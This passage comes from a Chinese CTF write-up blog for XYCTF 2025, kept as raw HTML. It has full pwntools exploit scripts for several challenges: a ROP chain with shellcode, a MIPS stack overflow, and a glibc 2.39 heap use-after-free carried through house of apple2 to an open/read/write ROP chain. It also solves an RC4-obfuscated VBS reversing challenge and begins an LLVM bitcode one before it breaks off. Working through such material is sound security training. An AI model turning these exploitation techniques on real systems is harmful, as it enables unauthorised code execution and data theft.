class="string">    mov eax,40; </span></span><br><span class="line"><span class="string">    syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x30</span> + p32(<span class="number">0x100</span>) + p32(<span class="number">0</span>)*<span class="number">3</span> + p64(pop_rdi_ret) + p64(base+<span class="number">0x4000</span>) + p64(pop_rsi_ret) + p64(<span class="number">0x1000</span>) + p64(pop_rdx_r12_ret) + p64(<span class="number">7</span>)*<span class="number">2</span> + p64(pop_rax_ret) + p64(<span class="number">0xa</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(base+<span class="number">0x4110</span>) + p64(pop_rbx_jmp_rax) + p64(<span class="number">0</span>) + asm(shellcode)</span><br><span class="line">reply(payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x38</span> + p64(canary) + p64(base+<span class="number">0x40a0</span>-<span class="number">8</span>) + p64(leave_ret) <span class="comment">#+ p64(base+0x1623)</span></span><br><span class="line">girlfriend(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406221210064.png"
                      class=""
                >
<p>XYCTF{0a311a59-8dbe-43c8-bc43-eba20569d0ad}</p>
<h4 id="pwn-ez3.0">pwn-EZ3.0</h4>
<p>一道mips架构的pwn题，以前做过<a
href="https://collectcrop.github.io/blog/2024/09/21/mips-pwn/">类似的</a>栈溢出+retshellcode，这一题比较简单，主要就是考察对mips架构的基本掌握。用Ghidra打开进行分析（我的IDA分析不了mips
(ಥ﹏ಥ)），发现chall函数里面糊脸就是一个栈溢出。具体返回地址在哪个位置可以结合动态调试来看。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406113623083.png"
                      class=""
                >
<p>用如下方式进行调试，记得-L那指定好，不然会找不到<code>/lib/ld.so.1</code>。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">program = <span class="string">&quot;./EZ3.0&quot;</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/mipsel-linux-gnu&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;6666&quot;</span>, program])</span><br><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    file <span class="subst">&#123;program&#125;</span></span></span><br><span class="line"><span class="string">    target remote 127.0.0.1:6666</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406114429666.png"
                      class=""
                >
<p>IDA搜字符串存在一个可以直接读取flag的命令。程序里也存在system函数的调用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406114152173.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406114651337.png"
                      class=""
                >
<p>之后就是要找个可以控$a0的gadget，可以沿用ROPgadget。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406114501059.png"
                      class=""
                >
<p>这里第一个gadget就可以正确的控制$a0并返回到$sp+4位置处了，在$sp+4布局调用system函数的地址就可以读取到flag了。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x00400830</span></span><br><span class="line">system = <span class="number">0x004009EC</span></span><br><span class="line">gadget = <span class="number">0x00400a20</span>     <span class="comment"># lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop</span></span><br><span class="line">command = <span class="number">0x0411010</span></span><br><span class="line">program = <span class="string">&quot;./EZ3.0&quot;</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/mipsel-linux-gnu&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;6666&quot;</span>, program])</span><br><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    file <span class="subst">&#123;program&#125;</span></span></span><br><span class="line"><span class="string">    target remote 127.0.0.1:6666</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./EZ3.0&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;8.147.132.32&quot;,41952)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span> + p32(<span class="number">0</span>) + p32(gadget) + p32(<span class="number">0</span>) + p32(system) + p32(command)</span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406221634476.png"
                      class=""
                >
<p>XYCTF{5e624a31-34f2-47f5-9486-5b8420a39a29}</p>
<h4 id="pwn-heap2">pwn-heap2</h4>
<p>这里给出本地能打通的exp，当时比赛时远程一直打不通，估计是和堆布局有关，毕竟我本地的libc环境是<code>GLIBC 2.39-0ubuntu8.4</code>，而给出的libc是<code>(Ubuntu GLIBC 2.39-0ubuntu8.3)</code>，差了一个小版本。我怀疑<code>libseccomp.so.2</code>版本也有所不同，所以可能在堆上的布局也不同，毕竟我在计算一些chunk的地址时是看的本地的偏移。</p>
<p>题目本身是一个裸的UAF，不过只有16次机会add
chunk，而且分配了就收不回来。这里的我们其实可以靠UAF实现劫持tcachebin
chunk的fd域，然后分配chunk到**_IO_list_all<strong>，将其改成我们可控的chunk地址，然后就是打</strong>house_of_apple2**。</p>
<p>由于题目开了沙箱，所以最后要靠<strong>svcudp_reply+29</strong>和<strong>swapcontext</strong>的gadget实现<strong>rop</strong>。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># context.terminal=[&quot;cmd.exe&quot;,&quot;/c&quot;, &quot;start&quot;, &quot;cmd.exe&quot;, &quot;/c&quot;, &quot;wsl.exe&quot;, &quot;-e&quot;]</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./heap2&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;8.147.132.32&quot;,28042)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&quot;a&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;data&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># offset = 0x1000</span></span><br><span class="line">add(<span class="number">0x280</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x280</span>)  <span class="comment">#1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x280</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recv()</span><br><span class="line">key = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base= (key&lt;&lt;<span class="number">12</span>) - <span class="number">0x15000</span> <span class="comment">#+ offset</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">9</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x203b20</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">_IO_list_all=libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps =libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gadget1 = libc_base + <span class="number">0x17923d</span>      <span class="comment">#svcudp_reply+29</span></span><br><span class="line">gadget2 = libc_base + <span class="number">0x5814D</span>       <span class="comment">#swapcontext</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000010f75b</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000110a4d</span></span><br><span class="line">pop_rsi_rbp_ret = libc_base + <span class="number">0x000000000002b46b</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x00000000000dd237</span></span><br><span class="line">mov_edx_ebx_3pop_ret = libc_base + <span class="number">0x00000000000b0124</span>        <span class="comment">#mov edx, ebx ; pop rbx ; pop r12 ; pop rbp ; ret  </span></span><br><span class="line">mov_edx_ebp_4pop_ret = libc_base + <span class="number">0x00000000000b00c8</span>        <span class="comment">#mov edx, ebp ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span></span><br><span class="line">pop_rbp_ret = libc_base + <span class="number">0x0000000000028a91</span></span><br><span class="line">pop_rbx_ret = libc_base + <span class="number">0x00000000000586d4</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000187A81</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002882f</span></span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">chunk9 =  heap_base + <span class="number">0x16090</span>   <span class="comment">#(key&lt;&lt;12) + 0x1000 + 0x90      #</span></span><br><span class="line">chunk10 = heap_base + <span class="number">0x16320</span> + <span class="number">0x10</span>    <span class="comment">#(key&lt;&lt;12) + 0x1000 + 0x320 + 0x10   #</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) + p64(<span class="number">2</span>) <span class="comment">#_write_base,_write_ptr</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)+p64(<span class="number">0</span>) <span class="comment">#_IO_buf_base,_IO_buf_end</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) + p64(chunk10+<span class="number">0x108</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x3000</span>)   <span class="comment">#lock</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(chunk10)    <span class="comment">#_wide_data</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)            <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)       <span class="comment">#setcontext-&gt;rsp</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)     <span class="comment">#setcontext-&gt;rcx</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps)  <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0xe0</span>+p64(chunk10+<span class="number">0x100</span>-<span class="number">0x68</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(gadget1)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x5000</span>)+p64(chunk10+<span class="number">0x118</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0</span>)+p64(gadget2)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">9</span> + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(chunk10+<span class="number">0x250</span>) + p64(ret) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(heap_base+<span class="number">0x5000</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += <span class="string">b&quot;/flag\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">rop = p64(pop_rdi_ret) + p64(chunk10+<span class="number">0x200</span>) + p64(pop_rsi_rbp_ret) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(pop_rbx_ret) + p64(<span class="number">0</span>) + p64(mov_edx_ebx_3pop_ret) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(syscall)</span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rop += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_rbp_ret) + p64(heap_base+<span class="number">0x5000</span>)*<span class="number">2</span> + p64(pop_rbx_ret) + p64(<span class="number">0x50</span>) + p64(mov_edx_ebx_3pop_ret) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">rop += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_rbp_ret) + p64(heap_base+<span class="number">0x5000</span>)*<span class="number">2</span> + p64(pop_rbx_ret) + p64(<span class="number">0x50</span>) + p64(mov_edx_ebx_3pop_ret) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(pop_rax_ret) + p64(<span class="number">1</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x250</span>,<span class="string">b&quot;\x00&quot;</span>) + rop</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">0x280</span>,fake_IO_FILE) <span class="comment">#9</span></span><br><span class="line">delete(<span class="number">1</span>)   <span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;key:&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x320</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x288</span>+p64(<span class="number">0x291</span>)+p64((_IO_list_all)^(key-<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,payload)     <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x280</span>)  <span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x280</span>,p64(chunk9))  <span class="comment">#12</span></span><br><span class="line"></span><br><span class="line">out()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h4 id="re-warmup">re-WARMUP</h4>
<p>给了一个vbs文件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406222411496.png"
                      class=""
                >
<p>可以直接用chatgpt一把梭，我们也可以先把每个chr算好提取出来看看大概逻辑是什么。其中有一些计算结果不在ascii范围之内，我们可以略过。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新读取 VBS 文件内容（由于状态已重置）</span></span><br><span class="line">file_path = <span class="string">r&quot;E:\ctf\xyctf2025\re\VBS\VBS\chal.vbs&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    vbs_code = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配所有 Chr(x [+|-] y [+|-] z ...) 形式的内容</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;Chr\((.*?)\)&quot;</span>, re.IGNORECASE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">eval_chr_expression</span>(<span class="params">expr</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">eval</span>(expr))</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Chr(<span class="subst">&#123;expr&#125;</span>)&quot;</span>  <span class="comment"># 保留原始表达式如果失败</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换 Chr 表达式为其对应的字符</span></span><br><span class="line">decoded_code = pattern.findall(vbs_code)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> decoded_code:</span><br><span class="line">    item = item.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;//&quot;</span>)</span><br><span class="line">    <span class="comment"># print(item)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">eval</span>(item)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Chr(<span class="subst">&#123;item&#125;</span>)&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>得到结果大概长这样，其实已经可以明显看出rc4的加密逻辑了：</p>
<div class="highlight-container" data-rel="Vbscript"><figure class="iseeu highlight vbscript"><table><tr><td class="code"><pre><span class="line">MsgBox <span class="string">&quot;Dear CTFER. Have fun in XYCTF 2025!&quot;</span></span><br><span class="line">flag = <span class="built_in">InputBox</span>(<span class="string">&quot;Enter the FLAG:&quot;</span>, <span class="string">&quot;XYCTF&quot;</span>)</span><br><span class="line">wefbuwiue = <span class="string">&quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot;</span> <span class="comment">&#x27; Chr( -5840+114 )Chr( -37790+6278 )Chr( -8.231351E+07//3957 )Chr( -14110+7864 )Chr( -30457-1205 )C4Chr( 517-7291 )Chr( -31263+6916 )Chr( -29685+9083 )Chr( -2.138515E+07//3442 )Chr( -26304-1370 )Chr( -1.510879E+08//6060 )Chr( -903-3261 )Chr( -22484-8007 )Chr( -34437+5126 )Chr( -10635+3856 )Chr( -1.97004E+08//9374 )Chr( -1.079768E+08//6550 )Chr( -2.533546E+07//3739 )Chr( -25645+6931 )Chr( -1.720817E+08//7056 )Chr( -12498+5774 )Chr( -2.164872E+08//7546 )Chr( -8955-8316 )</span></span><br><span class="line">qwfe = <span class="string">&quot;rc4key&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Chr( -5.682766E+07//8145 )Chr( -3.747722E+07//1805 )Chr( -20535-2876 )Chr( -5076000//750 )Chr( -28220-733 )Chr( -33583+7603 )RC4Chr( -4.203267E+07//6205 )Chr( -20128-4219 )Chr( -29090+8488 )Chr( -7954+1177 )Chr( -25730+8808 )Chr( -23859-3357 )</span></span><br><span class="line"><span class="keyword">Function</span> RunRC(sMessage, strKey)</span><br><span class="line">    <span class="keyword">Dim</span> kLen, i, j, temp, pos, outHex</span><br><span class="line">    <span class="keyword">Dim</span> s(<span class="number">255</span>), k(<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27; Chr( -10371+3595 )Chr( -21805-3310 )Chr( -1.930486E+08//8525 )Chr( -6242-530 )Chr( -2.479211E+08//9214 )Chr( -28712+8110 )Chr( 4047-9789 )?</span></span><br><span class="line">    kLen = <span class="built_in">Len</span>(strKey)</span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        s(i) = i</span><br><span class="line">        k(i) = <span class="built_in">Asc</span>(<span class="built_in">Mid</span>(strKey, (i Mod kLen) + <span class="number">1</span>, <span class="number">1</span>)) <span class="comment">&#x27; Chr( -13541+6804 )Chr( -7.75285E+07//2501 )Chr( -32055+4060 )Chr( -1318-5661 )Chr( -5.265648E+07//3209 )Chr( -31857+4377 )ASCIIChr( -2.477346E+07//3988 )Chr( -17020-9885 )Chr( -2542488//104 )</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27; KSAChr( -16-6721 )Chr( -28078-2921 )Chr( -24670-3325 )Chr( -9340+3372 )Chr( -25211-6560 )Chr( -22908+5154 )</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        j = (j + s(i) + k(i)) Mod <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27; PRGAChr( 3060-9834 )Chr( -1.219054E+08//5007 )Chr( -16837-3765 )Chr( -13859+7384 )Chr( -40413+8132 )Chr( -7.735399E+07//3455 )</span></span><br><span class="line">    i = <span class="number">0</span> : j = <span class="number">0</span> : outHex = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">For</span> pos = <span class="number">1</span> <span class="keyword">To</span> <span class="built_in">Len</span>(sMessage)</span><br><span class="line">        i = (i + <span class="number">1</span>) Mod <span class="number">256</span></span><br><span class="line">        j = (j + s(i)) Mod <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line"></span><br><span class="line">        <span class="comment">&#x27; Chr( -5.053404E+07//7460 )Chr( -26034+1687 )Chr( -19313-1289 )Chr( -30-6697 )Chr( -17366-1346 )Chr( -15077-1903 )Chr( -6552-432 )Chr( -13927-3764 )Chr( -37232+7921 )Chr( 1107-7886 )Chr( -15477-5539 )Chr( -1.750707E+07//1062 )Chr( -3.826407E+07//5647 )?</span></span><br><span class="line">        <span class="keyword">Dim</span> plainChar, cipherByte</span><br><span class="line">        plainChar = <span class="built_in">Asc</span>(<span class="built_in">Mid</span>(sMessage, pos, <span class="number">1</span>)) <span class="comment">&#x27; Chr( -5.533603E+07//8508 )Chr( -1.094461E+07//378 )Chr( -19198-7803 )Chr( -1503-5013 )Chr( -22047-8352 )SCIIChr( -16376+9628 )Chr( -3.882402E+07//1232 )Chr( -35990+7452 )</span></span><br><span class="line">        cipherByte = s((s(i) + s(j)) Mod <span class="number">256</span>) <span class="keyword">Xor</span> plainChar</span><br><span class="line">        outHex = outHex &amp; <span class="built_in">Right</span>(<span class="string">&quot;0&quot;</span> &amp; <span class="built_in">Hex</span>(cipherByte), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">    RunRC = outHex</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Chr( -15360+8376 )Chr( -1.435792E+08//8237 )Chr( -21866-10 )Chr( -4.86175E+07//8145 )Chr( -1.932544E+08//5987 )Chr( -19485+2053 )Chr( -10516-6235 )</span></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">LCase</span>(RunRC(flag, qwfe)) = <span class="built_in">LCase</span>(wefbuwiue) <span class="keyword">Then</span></span><br><span class="line">    MsgBox <span class="string">&quot;Congratulations! Correct FLAG!&quot;</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    MsgBox <span class="string">&quot;Wrong flag.&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br></pre></td></tr></table></figure></div>
<p>之后直接rc4解密即可。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">cipher_hex = <span class="string">&quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot;</span></span><br><span class="line">key = <span class="string">b&quot;rc4key&quot;</span></span><br><span class="line"></span><br><span class="line">cipher_bytes = binascii.unhexlify(cipher_hex)</span><br><span class="line">rc4 = ARC4.new(key)</span><br><span class="line">plaintext = rc4.decrypt(cipher_bytes)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext.decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406223841395.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406224031766.png"
                      class=""
                >
<p>XYCTF{5f9f46c147645dd1e2c8044325d4f93c}</p>
<h4 id="re-dragon">re-Dragon</h4>
<p><code>.bc</code> 文件是 LLVM 编译生成的 <strong>bitcode
文件</strong>，也叫“中间表示 IR（Intermediate
Representation）”，不是机器码，也不是源代码，而是一种 LLVM
的中间形式。我们可以通过<code>llvm-dis-17</code>来将其转换成人类可读的
LLVM IR（文本形式）</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406224346310.png"
                      class=""
                >
<p>反编译出来的程序如下：</p>
